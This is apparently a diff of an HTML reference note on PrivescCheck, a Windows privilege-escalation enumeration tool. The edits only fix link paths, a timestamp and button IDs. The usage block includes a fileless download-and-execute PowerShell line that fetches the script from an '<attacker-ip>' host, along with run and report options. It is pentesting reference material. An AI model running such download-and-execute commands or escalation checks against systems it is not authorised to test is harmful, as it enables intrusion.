@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-20 Mon 15:41 -->
+<!-- 2026-07-20 Mon 15:58 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>PrivescCheck</title>
@@ -885,11 +885,11 @@ defaults to a single comprehensive scored report.
 </p>
 
 <p>
-Related: <a href="../org/20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
-         <a href="../org/20260314T005756--winpeas__cybersecurity_tool.html">WinPEAS</a>
-         <a href="../org/20260314T005748--seatbelt__cybersecurity_tool.html">Seatbelt</a>
-         <a href="../org/20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a>
-         <a href="../org/20260718T114426--windows-privilege-escalation-tools-—-comparison__comparison_cybersecurity_pentesting_reference.html">Windows Privilege Escalation Tools — Comparison</a>
+Related: <a href="20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
+         <a href="20260314T005756--winpeas__cybersecurity_tool.html">WinPEAS</a>
+         <a href="20260314T005748--seatbelt__cybersecurity_tool.html">Seatbelt</a>
+         <a href="20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a>
+         <a href="20260718T114426--windows-privilege-escalation-tools-—-comparison__comparison_cybersecurity_pentesting_reference.html">Windows Privilege Escalation Tools — Comparison</a>
 </p>
 <div id="outline-container-orgfc28bff" class="outline-2">
 <h2 id="orgfc28bff">Core Functionality</h2>
@@ -920,7 +920,7 @@ accounts.</li>
 high-privileged commands but sourcing input or executables from
 a path the low-privileged user can modify.</li>
 <li><b>Kernel Vulnerabilities:</b> OS and patch-level information, similar
-in intent to <a href="../org/20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a>
+in intent to <a href="20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a>
 though that's a dedicated cross-reference tool and this is a
 secondary data point within a broader scan.</li>
 </ol>
@@ -930,11 +930,11 @@ secondary data point within a broader scan.</li>
 <h2 id="org814830e">Running PrivescCheck</h2>
 <div class="outline-text-2" id="text-org814830e">
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_ad7e8e79b44b4d27bcb129aaa9e9f21f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_68bb192e27dc4dab92f51c394b43bd12>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ad7e8e79b44b4d27bcb129aaa9e9f21f=document.querySelector('button[name=btn_ad7e8e79b44b4d27bcb129aaa9e9f21f]');
-copyBtnbtn_ad7e8e79b44b4d27bcb129aaa9e9f21f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Import and run the full check — most common usage\nImport-Module .\\PrivescCheck.ps1\nInvoke-PrivescCheck\n\n# Fileless execution directly from a remote host (no disk write)\nIEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PrivescCheck.ps1'); Invoke-PrivescCheck\n\n# Extended checks (includes noisier/slower tests not run by default)\nInvoke-PrivescCheck -Extended\n\n# Export results to a file for offline review\nInvoke-PrivescCheck -Report privesc_report -Format HTML\n`);copyBtnbtn_ad7e8e79b44b4d27bcb129aaa9e9f21f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ad7e8e79b44b4d27bcb129aaa9e9f21f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12=document.querySelector('button[name=btn_68bb192e27dc4dab92f51c394b43bd12]');
+copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Import and run the full check — most common usage\nImport-Module .\\PrivescCheck.ps1\nInvoke-PrivescCheck\n\n# Fileless execution directly from a remote host (no disk write)\nIEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/PrivescCheck.ps1'); Invoke-PrivescCheck\n\n# Extended checks (includes noisier/slower tests not run by default)\nInvoke-PrivescCheck -Extended\n\n# Export results to a file for offline review\nInvoke-PrivescCheck -Report privesc_report -Format HTML\n`);copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_68bb192e27dc4dab92f51c394b43bd12.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -980,7 +980,7 @@ execution tool to actually escalate.
 covers the highest-yield checks; only reach for <code>-Extended</code> if
 the default pass comes back clean or ambiguous</li>
 <li>Cross-reference any flagged kernel/patch information against
-<a href="../org/20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a> directly
+<a href="20260314T005757--windows-exploit-suggester__cybersecurity_tool.html">Windows Exploit Suggester</a> directly
 rather than relying on PrivescCheck's own summary — the dedicated
 tool tracks CVEs more precisely</li>
 <li>The <code>-Report</code> flag is worth using on any box where you're likely
